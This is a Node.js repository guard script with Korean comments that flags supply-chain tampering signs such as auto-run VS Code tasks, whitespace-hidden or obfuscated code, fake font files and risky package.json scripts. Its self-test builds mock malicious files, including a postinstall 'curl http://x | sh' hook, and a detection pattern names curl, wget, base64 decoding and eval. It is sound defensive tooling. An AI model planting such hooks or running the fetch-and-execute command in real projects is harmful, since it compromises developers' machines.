// 저장소 변조(공급망 공격) 징후를 찾는 가드. 의존성 없이 Node 내장 모듈만 쓰므로 `yarn install` 전에 실행.
// 알려진 수법(폴더를 열면 자동 실행되는 VS Code task, 공백 뒤에 숨긴 난독화 코드, 폰트로 위장한 JS,
// dev·install 스크립트에 끼운 node 호출)을 휴리스틱으로 검출.
// ponytail: 휴리스틱이라 우회 가능. 방어의 한 겹일 뿐이고 기본은 브랜치 보호와 CODEOWNERS 리뷰.
//   오탐이 늘면 규칙별 허용 목록 추가.
import {
  mkdirSync,
  mkdtempSync,
  openSync,
  readdirSync,
  readFileSync,
  readSync,
  closeSync,
  rmSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative, sep } from 'node:path';

const IGNORED_DIRS = new Set([
  'node_modules',
  '.git',
  '.yarn',
  'dist',
  'build',
  '.next',
  '.turbo',
  '.expo',
  'storybook-static',
  'coverage',
  'playwright-report',
  'test-results',
  '.omc',
  '.omx',
]);
// git에 올라가지 않는 로컬 전용 경로
const IGNORED_PREFIXES = ['.agents/notes/', '.agents/state/', '.claude/worktrees/', '.worktrees/'];
const IGNORED_FILES = new Set(['yarn.lock', 'pnpm-lock.yaml', 'package-lock.json']);

const CODE_EXT = /\.(?:[cm]?[jt]sx?|json|html|ya?ml)$/i;
const LONG_LINE_EXT = /\.(?:[cm]?[jt]sx?)$/i;
const FONT_EXT = /\.(?:eot|woff2?|ttf|otf)$/i;
const MAX_TEXT_BYTES = 2 * 1024 * 1024;
const MAX_LINE = 3000;
const HIDDEN_AFTER_SPACES = /[ \t]{80,}\S/;
const OBFUSCATED_IDENT = /\b_0x[0-9a-f]{4,8}\b/g;
const LIFECYCLE = new Set([
  'preinstall',
  'install',
  'postinstall',
  'prepublish',
  'prepack',
  'postpack',
  'prepare',
]);
const ALLOWED_LIFECYCLE = { prepare: 'husky' };
const ALLOWED_NODE_PREFIXES = ['turbo/', '.agents/', '.github/', 'scripts/'];
// 옵션은 대시 뒤 이름 첫 글자를 `\w`로 고정해 `--x`를 `-`+`-x`로도 읽는 모호성(지수적 역추적) 제거
// `--` 단독은 옵션 끝 표시로 따로 허용, `-` 단독(stdin)은 옵션으로 보지 않음
const NODE_RUN = /\bnode\s+(?:--?\w[\w-]*(?:=\S+)?\s+|--\s+)*(\S+\.(?:[cm]?js))\b/g;
const NODE_TEST_FILE = /\.test\.[cm]?js$/;
const DOWNLOAD_EXEC = /\b(?:curl|wget)\b|base64\s+(?:-d|--decode)|\beval\s/;

function walk(root, dir = root, out = []) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const abs = join(dir, entry.name);
    const rel = relative(root, abs).split(sep).join('/');
    if (entry.isDirectory()) {
      if (IGNORED_DIRS.has(entry.name) || IGNORED_PREFIXES.some((p) => `${rel}/`.startsWith(p)))
        continue;
      walk(root, abs, out);
    } else if (entry.isFile()) {
      if (
        IGNORED_FILES.has(entry.name) ||
        /^\.pnp\./.test(entry.name) ||
        /\.min\.js$/.test(entry.name)
      )
        continue;
      out.push({ abs, rel });
    }
  }
  return out;
}

function readHead(abs, bytes) {
  const fd = openSync(abs, 'r');
  try {
    const buf = Buffer.alloc(bytes);
    const n = readSync(fd, buf, 0, bytes, 0);
    return buf.subarray(0, n);
  } finally {
    closeSync(fd);
  }
}

export function scan(root) {
  const findings = [];
  const add = (file, rule, detail, line) => findings.push({ file, rule, detail, line });

  for (const { abs, rel } of walk(root)) {
    const size = statSync(abs).size;

    // 1) 폴더를 열면 자동 실행되는 VS Code task
    if (/(^|\/)\.vscode\/tasks\.json$/.test(rel)) {
      const text = readFileSync(abs, 'utf8');
      if (/folderOpen/.test(text))
        add(
          rel,
          'vscode-auto-task',
          'tasks.json 에 runOn: folderOpen 이 있다. 폴더를 열기만 해도 명령이 실행된다',
        );
    }
    // 2) 자동 task 허용 설정
    if (/(^|\/)\.vscode\/settings\.json$/.test(rel)) {
      const text = readFileSync(abs, 'utf8');
      if (/"task\.allowAutomaticTasks"\s*:\s*(?:"on"|true)/.test(text)) {
        add(
          rel,
          'vscode-allow-auto-tasks',
          'task.allowAutomaticTasks 를 켰다. 자동 task 실행 승인 절차를 건너뛴다',
        );
      }
    }
    // 3) 폰트로 위장한 텍스트(JS)
    if (FONT_EXT.test(rel) && size > 0) {
      const head = readHead(abs, 512);
      if (!head.includes(0))
        add(
          rel,
          'fake-font',
          '폰트 확장자인데 앞부분에 바이너리(NUL)가 없다. 텍스트·스크립트로 위장했을 수 있다',
        );
    }
    // 4) package.json 스크립트
    if (/(^|\/)package\.json$/.test(rel)) {
      let pkg;
      try {
        pkg = JSON.parse(readFileSync(abs, 'utf8'));
      } catch {
        add(rel, 'invalid-package-json', 'package.json 을 파싱할 수 없다');
        continue;
      }
      for (const [name, cmd] of Object.entries(pkg.scripts ?? {})) {
        if (LIFECYCLE.has(name) && cmd !== ALLOWED_LIFECYCLE[name]) {
          add(
            rel,
            'lifecycle-script',
            `설치·배포 시점에 자동 실행되는 "${name}" 스크립트가 허용 목록(${JSON.stringify(ALLOWED_LIFECYCLE)})에 없다: ${cmd}`,
          );
        }
        if (DOWNLOAD_EXEC.test(cmd))
          add(
            rel,
            'script-download-exec',
            `"${name}" 스크립트에 curl·wget·base64 디코드·eval 이 있다: ${cmd}`,
          );
        for (const m of cmd.matchAll(NODE_RUN)) {
          const path = m[1].replace(/^(?:\.\.?\/)+/, '');
          // `node --test x.test.mjs`는 허용. 파일 내용은 못 보므로 악의적인 테스트 파일은 코드 오너 리뷰가 차단.
          if (/\s--test\b/.test(m[0]) && NODE_TEST_FILE.test(path)) continue;
          if (!ALLOWED_NODE_PREFIXES.some((p) => path.startsWith(p))) {
            add(
              rel,
              'script-node-run',
              `"${name}" 스크립트가 허용 경로(${ALLOWED_NODE_PREFIXES.join(', ')}) 밖의 파일을 node 로 실행한다: ${m[1]}`,
            );
          }
        }
      }
    }
    // 5) 코드 파일 안에 숨긴 페이로드
    if (CODE_EXT.test(rel) && size <= MAX_TEXT_BYTES) {
      const lines = readFileSync(abs, 'utf8').split('\n');
      let obfuscated = 0;
      lines.forEach((text, i) => {
        if (HIDDEN_AFTER_SPACES.test(text))
          add(
            rel,
            'hidden-after-spaces',
            '공백 80칸 이상 뒤에 코드가 이어진다(화면 밖에 숨긴 코드일 수 있다)',
            i + 1,
          );
        if (LONG_LINE_EXT.test(rel) && text.length > MAX_LINE)
          add(
            rel,
            'very-long-line',
            `한 줄이 ${text.length}자다(난독화·번들 코드일 수 있다)`,
            i + 1,
          );
        obfuscated += (text.match(OBFUSCATED_IDENT) ?? []).length;
      });
      if (obfuscated >= 5)
        add(
          rel,
          'obfuscated-identifiers',
          `난독화 도구가 만드는 _0x… 식별자가 ${obfuscated}개 있다`,
        );
    }
  }

  // 6) .env 가 gitignore 에서 빠지지 않았는지
  try {
    const ignore = readFileSync(join(root, '.gitignore'), 'utf8')
      .split('\n')
      .map((l) => l.trim());
    if (!ignore.includes('.env'))
      add('.gitignore', 'env-not-ignored', '.gitignore 에 .env 가 없다. 시크릿이 커밋될 수 있다');
  } catch {
    add('.gitignore', 'gitignore-missing', '.gitignore 를 읽을 수 없다');
  }
  return findings;
}

function report(findings) {
  for (const f of findings) {
    console.error(`✖ ${f.file}${f.line ? `:${f.line}` : ''}  [${f.rule}] ${f.detail}`);
  }
}

function selfTest() {
  const dir = mkdtempSync(join(tmpdir(), 'check-suspicious-'));
  try {
    const put = (rel, content) => {
      const abs = join(dir, rel);
      mkdirSync(join(abs, '..'), { recursive: true });
      writeFileSync(abs, content);
    };
    // 정상 저장소
    put('.gitignore', '.env\nnode_modules\n');
    put(
      'package.json',
      JSON.stringify({
        scripts: {
          prepare: 'husky',
          dev: 'vite',
          check: 'node turbo/workflows/x.mjs',
          test: 'node --test sanitize.test.mjs',
        },
      }),
    );
    put('src/app.js', 'export const a = 1;\n');
    const clean = scan(dir);
    if (clean.length) throw new Error(`정상 저장소에서 탐지됨: ${JSON.stringify(clean)}`);

    // 알려진 수법을 흉내 낸 저장소
    put('.vscode/tasks.json', '{"tasks":[{"runOptions":{"runOn":"folderOpen"}}]}');
    put('.vscode/settings.json', '{"task.allowAutomaticTasks":"on"}');
    // 예시 식별자를 코드로 생성(이 파일 자체가 난독화 규칙에 걸리지 않게)
    const idents = Array.from({ length: 5 }, (_, i) => `_0x${(0x1a2b + i).toString(16)}`).join(',');
    put('api.js', `module.exports = 1;${' '.repeat(120)}var ${idents};`);
    put('fonts/fa-solid-900.eot', 'require("child_process").spawn("node")');
    put(
      'package.json',
      JSON.stringify({
        scripts: {
          dev: 'node api.js && vite',
          postinstall: 'curl http://x | sh',
          test: 'node --test evil.mjs',
        },
      }),
    );
    put('.gitignore', 'node_modules\n');
    const found = scan(dir);
    // --test 예외가 테스트 파일이 아닌 실행까지 풀어 주지 않는지 확인
    if (!found.some((f) => f.rule === 'script-node-run' && f.detail.includes('evil.mjs')))
      throw new Error('node --test 예외가 테스트 파일 아닌 실행(evil.mjs)까지 허용했다');
    const rules = new Set(found.map((f) => f.rule));
    const expected = [
      'vscode-auto-task',
      'vscode-allow-auto-tasks',
      'hidden-after-spaces',
      'obfuscated-identifiers',
      'fake-font',
      'script-node-run',
      'lifecycle-script',
      'script-download-exec',
      'env-not-ignored',
    ];
    const missing = expected.filter((r) => !rules.has(r));
    if (missing.length) throw new Error(`탐지 못 한 규칙: ${missing.join(', ')}`);
    // `-- -` 반복 입력의 지수적 역추적 회귀 방지(CodeQL js/redos)
    const started = Date.now();
    const runs = [...`node ${'-- -'.repeat(40)}!`.matchAll(NODE_RUN)].length;
    // `node - <인자>`의 인자는 실행 파일이 아니므로 검출하지 않음
    const stdinRuns = [...'node - packages/tool.js'.matchAll(NODE_RUN)].length;
    if (runs !== 0 || stdinRuns !== 0 || Date.now() - started > 1000) {
      throw new Error('NODE_RUN 정규식이 반복 옵션 입력에서 느리거나 잘못 매치한다');
    }
    console.log('self-test OK');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

if (process.argv.includes('--self-test')) {
  selfTest();
} else if (
  import.meta.url === `file://${process.argv[1]}` ||
  process.argv[1]?.endsWith('check-suspicious.mjs')
) {
  const rootArg = process.argv.indexOf('--root');
  const root = rootArg > -1 ? process.argv[rootArg + 1] : process.cwd();
  const findings = scan(root);
  if (findings.length) {
    report(findings);
    console.error(
      `\n수상한 변경 ${findings.length}건. 의도한 변경이면 코드 오너와 확인한 뒤 규칙의 허용 목록을 조정한다(turbo/workflows/check-suspicious.mjs).`,
    );
    process.exit(1);
  }
  console.log('check-suspicious: 이상 없음');
}
